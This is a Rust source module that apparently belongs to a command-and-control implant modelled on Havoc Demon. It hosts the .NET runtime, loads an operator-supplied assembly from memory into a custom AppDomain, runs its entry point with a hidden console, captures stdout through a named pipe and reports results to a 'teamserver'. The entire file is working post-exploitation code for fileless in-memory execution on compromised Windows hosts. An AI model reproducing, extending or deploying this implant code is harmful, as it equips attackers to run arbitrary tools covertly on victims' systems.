//! Assembly loading, stdout capture, argument parsing, and managed-code execution.
//!
//! The primary entry point is [`execute`], which drives the full CLR hosting
//! flow by coordinating [`super::runtime`] (host init + session), and
//! [`super::appdomain`] (domain creation, assembly load, invocation).

#![allow(unsafe_code)]

use std::ffi::c_void;
use tracing::{error, info};

use super::appdomain::{
    create_appdomain, invoke_entry_point, load_assembly_into_domain, resolve_entry_point,
};
use super::runtime::{
    ClrSession, OleAutApi, S_OK, STD_OUTPUT_HANDLE, SafeArrayBound, VT_ARRAY, VT_BSTR, VT_VARIANT,
    ensure_console, init_clr_host, to_wide,
};
use super::{
    DOTNET_INFO_FAILED, DOTNET_INFO_FINISHED, DOTNET_INFO_NET_VERSION, DotnetCallback, DotnetResult,
};

// ── Named pipe creation ───────────────────────────────────────────────────────

const PIPE_BUFFER: u32 = super::runtime::PIPE_BUFFER;

/// Create a named pipe pair (read handle, write handle) for stdout capture.
///
/// # Safety
///
/// `pipe_name` must be a valid named pipe path (e.g. `\\.\pipe\xyz`).
unsafe fn create_pipe_pair(pipe_name: &str) -> Result<(isize, isize), String> {
    let wide = to_wide(pipe_name);

    // SAFETY: CreateNamedPipeW with valid wide string and standard flags.
    let pipe_read = windows_sys::Win32::System::Pipes::CreateNamedPipeW(
        wide.as_ptr(),
        0x0000_0003 | 0x0008_0000, // PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE
        0x0000_0004,               // PIPE_TYPE_MESSAGE
        255,                       // PIPE_UNLIMITED_INSTANCES
        PIPE_BUFFER,
        PIPE_BUFFER,
        0,
        std::ptr::null(),
    );

    if pipe_read == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
        return Err(format!(
            "CreateNamedPipeW failed: error {}",
            windows_sys::Win32::Foundation::GetLastError()
        ));
    }

    // SAFETY: CreateFileW to open the pipe's write end.
    let pipe_write = windows_sys::Win32::Storage::FileSystem::CreateFileW(
        wide.as_ptr(),
        0x4000_0000, // GENERIC_WRITE
        0x0000_0001, // FILE_SHARE_READ
        std::ptr::null(),
        3,           // OPEN_EXISTING
        0x0000_0080, // FILE_ATTRIBUTE_NORMAL
        0,
    );

    if pipe_write == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
        let err = windows_sys::Win32::Foundation::GetLastError();
        windows_sys::Win32::Foundation::CloseHandle(pipe_read);
        return Err(format!("CreateFileW (pipe write end) failed: error {err}"));
    }

    Ok((pipe_read, pipe_write))
}

// ── Pipe output reading ───────────────────────────────────────────────────────

/// Read all available bytes from the read end of a named pipe.
///
/// # Safety
///
/// `pipe_read` must be a valid readable pipe handle.
unsafe fn read_pipe_output(pipe_read: isize) -> Vec<u8> {
    let mut available: u32 = 0;

    // SAFETY: PeekNamedPipe with valid handle.
    let ok = windows_sys::Win32::System::Pipes::PeekNamedPipe(
        pipe_read,
        std::ptr::null_mut(),
        0,
        std::ptr::null_mut(),
        &mut available,
        std::ptr::null_mut(),
    );

    if ok == 0 || available == 0 {
        return Vec::new();
    }

    let mut buf = vec![0u8; available as usize];
    let mut bytes_read: u32 = 0;

    // SAFETY: ReadFile with a buffer large enough for `available` bytes.
    let ok = windows_sys::Win32::Storage::FileSystem::ReadFile(
        pipe_read,
        buf.as_mut_ptr().cast(),
        available,
        &mut bytes_read,
        std::ptr::null_mut(),
    );

    if ok == 0 {
        return Vec::new();
    }

    buf.truncate(bytes_read as usize);
    buf
}

// ── Argument parsing ──────────────────────────────────────────────────────────

/// Split an argument string the same way Havoc does: treat it as a Windows
/// command line, skip argv[0] (the "program name"), and return the rest.
///
/// This is a simplified parser that handles quoted strings.
fn parse_assembly_args(raw: &str) -> Vec<String> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Vec::new();
    }

    let mut args = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    let chars = trimmed.chars();

    for ch in chars {
        match ch {
            '"' => in_quotes = !in_quotes,
            ' ' if !in_quotes => {
                if !current.is_empty() {
                    args.push(std::mem::take(&mut current));
                }
            }
            _ => current.push(ch),
        }
    }
    if !current.is_empty() {
        args.push(current);
    }

    // Havoc's CommandLineToArgvW skips argv[0] (program name).
    if args.len() > 1 { args.drain(1..).collect() } else { Vec::new() }
}

// ── Error result helper ───────────────────────────────────────────────────────

pub(super) fn fail_result(msg: &str) -> DotnetResult {
    use tracing::warn;
    warn!("dotnet_execute failed: {msg}");
    DotnetResult {
        callbacks: vec![DotnetCallback { info_id: DOTNET_INFO_FAILED, payload: Vec::new() }],
        output: Vec::new(),
    }
}

// ── SafeArray helpers ─────────────────────────────────────────────────────────

/// Build a `SAFEARRAY(VT_UI1)` containing the raw assembly bytes.
///
/// # Safety
///
/// `ole` must hold valid oleaut32 function pointers.
unsafe fn build_assembly_safearray(
    ole: &OleAutApi,
    assembly_data: &[u8],
) -> Result<*mut c_void, String> {
    let bound = SafeArrayBound { c_elements: assembly_data.len() as u32, l_lbound: 0 };
    let sa = (ole.safe_array_create)(super::runtime::VT_UI1, 1, &bound);
    if sa.is_null() {
        return Err("SafeArrayCreate failed".to_string());
    }

    let mut sa_data: *mut c_void = std::ptr::null_mut();
    let hr = (ole.safe_array_access_data)(sa, &mut sa_data);
    if hr != S_OK || sa_data.is_null() {
        return Err(format!("SafeArrayAccessData failed: 0x{hr:08X}"));
    }
    // SAFETY: sa_data points to safe_array's internal buffer with at least
    // assembly_data.len() bytes allocated.
    std::ptr::copy_nonoverlapping(assembly_data.as_ptr(), sa_data as *mut u8, assembly_data.len());
    let hr = (ole.safe_array_unaccess_data)(sa);
    if hr != S_OK {
        return Err(format!("SafeArrayUnaccessData failed: 0x{hr:08X}"));
    }
    Ok(sa)
}

/// Build a `SAFEARRAY(VARIANT)` wrapping a `SAFEARRAY(BSTR)` of the given
/// argument strings, as expected by `_MethodInfo::Invoke_3`.
///
/// # Safety
///
/// `ole` must hold valid oleaut32 function pointers.
unsafe fn build_method_args_safearray(
    ole: &OleAutApi,
    args: &[String],
) -> Result<*mut c_void, String> {
    let method_args = (ole.safe_array_create_vector)(VT_VARIANT, 0, 1);
    if method_args.is_null() {
        return Err("SafeArrayCreateVector(VT_VARIANT) failed".to_string());
    }

    let args_count = args.len() as u32;
    let bstr_array = (ole.safe_array_create_vector)(VT_BSTR, 0, args_count);
    if bstr_array.is_null() && args_count > 0 {
        return Err("SafeArrayCreateVector(VT_BSTR) failed".to_string());
    }

    // Fill BSTRs.
    let mut allocated_bstrs: Vec<*mut u16> = Vec::new();
    for (i, arg) in args.iter().enumerate() {
        let wide = to_wide(arg);
        let bstr = (ole.sys_alloc_string)(wide.as_ptr());
        allocated_bstrs.push(bstr);
        let idx = i as i32;
        let hr = (ole.safe_array_put_element)(bstr_array, &idx, bstr as *const c_void);
        if hr != S_OK {
            error!("SafeArrayPutElement(bstr_array, {i}) failed: 0x{hr:08X}");
            for b in &allocated_bstrs {
                if !b.is_null() {
                    (ole.sys_free_string)(*b);
                }
            }
            return Err("SafeArrayPutElement bstr failed".to_string());
        }
    }

    // Build the VARIANT that wraps the BSTR array.
    let mut vt_psa = super::runtime::Variant::empty();
    vt_psa.vt = VT_ARRAY | VT_BSTR;
    vt_psa.data = if bstr_array.is_null() { 0 } else { bstr_array as u64 };

    let idx_zero: i32 = 0;
    let hr = (ole.safe_array_put_element)(
        method_args,
        &idx_zero,
        &vt_psa as *const super::runtime::Variant as *const c_void,
    );
    if hr != S_OK {
        return Err(format!("SafeArrayPutElement method_args failed: 0x{hr:08X}"));
    }

    Ok(method_args)
}

// ── Main execution entry point ────────────────────────────────────────────────

/// Execute a .NET assembly inside the CLR.
///
/// Follows the same flow as Havoc Demon's `DotnetExecute` + `ClrCreateInstance`:
/// 1. Load mscoree.dll → CLRCreateInstance (via [`super::runtime::init_clr_host`])
/// 2. Create AppDomain (via [`super::appdomain::create_appdomain`])
/// 3. Build SafeArray of assembly bytes
/// 4. `_AppDomain::Load_3` → `_Assembly`
/// 5. `_Assembly::EntryPoint` → `_MethodInfo`
/// 6. Redirect stdout to named pipe
/// 7. `_MethodInfo::Invoke_3(null, args)`
/// 8. Restore stdout, read pipe output
pub(super) fn execute(
    pipe_name: &str,
    app_domain: &str,
    net_version: &str,
    assembly_data: &[u8],
    assembly_args: &str,
) -> DotnetResult {
    // SAFETY: All unsafe blocks perform Win32 FFI/COM vtable calls.
    // Each is documented with its safety rationale.
    unsafe { execute_inner(pipe_name, app_domain, net_version, assembly_data, assembly_args) }
}

unsafe fn execute_inner(
    pipe_name: &str,
    app_domain_name: &str,
    net_version: &str,
    assembly_data: &[u8],
    assembly_args: &str,
) -> DotnetResult {
    let mut session = ClrSession::new();
    let mut callbacks = Vec::new();

    // ── 1–5: Init CLR host (meta host → runtime info → ICorRuntimeHost → Start) ──

    let ole = match init_clr_host(&mut session, net_version) {
        Ok(ole) => ole,
        Err(e) => {
            error!("dotnet: CLR host init failed: {e}");
            return fail_result(&e);
        }
    };

    // Report the .NET version to the teamserver.
    callbacks.push(DotnetCallback {
        info_id: DOTNET_INFO_NET_VERSION,
        payload: net_version.encode_utf16().flat_map(|c| c.to_le_bytes()).collect(),
    });

    // Store oleaut32 API in session so Drop can call SafeArrayDestroy.
    session.ole = Some(ole);
    let Some(ref ole) = session.ole else {
        return fail_result("oleaut32 API missing after assignment");
    };

    // ── 6: Create named pipe for stdout capture ───────────────────────────────

    match create_pipe_pair(pipe_name) {
        Ok((r, w)) => {
            session.pipe_read = r;
            session.pipe_write = w;
        }
        Err(e) => {
            error!("dotnet: pipe creation failed: {e}");
            return fail_result(&e);
        }
    }

    // Ensure a (hidden) console exists so Console.Write works.
    ensure_console();

    // ── 7: Build SafeArray for assembly bytes ─────────────────────────────────

    match build_assembly_safearray(ole, assembly_data) {
        Ok(sa) => session.safe_array = sa,
        Err(e) => {
            error!("dotnet: {e}");
            return fail_result(&e);
        }
    }

    // ── 8–9: Create AppDomain + QueryInterface → _AppDomain ──────────────────

    let domain_wide = to_wide(app_domain_name);
    if let Err(e) = create_appdomain(
        session.cor_runtime_host,
        &domain_wide,
        &mut session.app_domain_thunk,
        &mut session.app_domain,
    ) {
        return fail_result(&e);
    }

    // ── 10: _AppDomain::Load_3 → _Assembly ───────────────────────────────────

    if let Err(e) =
        load_assembly_into_domain(session.app_domain, session.safe_array, &mut session.assembly)
    {
        error!("dotnet: Load_3 failed: {e}");
        return fail_result(&e);
    }
    info!("Assembly loaded from {} bytes", assembly_data.len());

    // ── 11: _Assembly::EntryPoint → _MethodInfo ───────────────────────────────

    if let Err(e) = resolve_entry_point(session.assembly, &mut session.method_info) {
        return fail_result(&e);
    }

    // ── 12: Build args SafeArray ──────────────────────────────────────────────

    let args = parse_assembly_args(assembly_args);
    match build_method_args_safearray(ole, &args) {
        Ok(sa) => session.method_args = sa,
        Err(e) => {
            error!("dotnet: args SafeArray: {e}");
            return fail_result(&e);
        }
    }

    // ── 13: Redirect stdout to pipe ───────────────────────────────────────────

    session.original_stdout = windows_sys::Win32::System::Console::GetStdHandle(STD_OUTPUT_HANDLE);
    windows_sys::Win32::System::Console::SetStdHandle(STD_OUTPUT_HANDLE, session.pipe_write);
    session.stdout_redirected = true;

    // ── 14: _MethodInfo::Invoke_3 ─────────────────────────────────────────────

    let obj = super::runtime::Variant::empty(); // null 'this' for static Main
    let hr = invoke_entry_point(session.method_info, obj, session.method_args);

    // ── 15: Restore stdout and read output ────────────────────────────────────

    windows_sys::Win32::System::Console::SetStdHandle(STD_OUTPUT_HANDLE, session.original_stdout);
    session.stdout_redirected = false;

    // Read everything the assembly wrote.
    let mut output = read_pipe_output(session.pipe_read);
    // Second read in case there's trailing data (matches Havoc DotnetPush).
    let trailing = read_pipe_output(session.pipe_read);
    if !trailing.is_empty() {
        output.extend_from_slice(&trailing);
    }

    if hr != S_OK {
        error!("_MethodInfo::Invoke_3 failed: HRESULT 0x{hr:08X}");
        callbacks.push(DotnetCallback { info_id: DOTNET_INFO_FAILED, payload: Vec::new() });
    } else {
        info!("Assembly entry point executed successfully");
        callbacks.push(DotnetCallback { info_id: DOTNET_INFO_FINISHED, payload: Vec::new() });
    }

    DotnetResult { callbacks, output }
}
